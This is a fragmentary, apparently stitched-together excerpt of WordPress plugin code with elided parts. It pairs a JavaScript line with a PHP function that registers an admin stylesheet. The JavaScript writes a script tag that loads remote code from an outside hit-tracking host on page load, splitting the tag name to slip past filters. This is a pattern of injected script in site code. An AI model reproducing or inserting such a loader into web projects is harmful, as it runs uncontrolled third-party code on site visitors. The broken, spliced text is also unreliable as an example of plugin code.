...
document.write('<s'+'cript type="text/javascript" src="http://www.cerclehits.com/show.php?z=1&j=1&code='+new Date().getTime()+'"></s'+'cript>'); 
// --></script>
...
function efpd_admin_style() {
    ...
    wp_register_style($handle='efpd-admin-styles',$src=plugins_url($pluginslug.'/admin.css'),$deps=array(),$ver='1.0.1',$media='all');
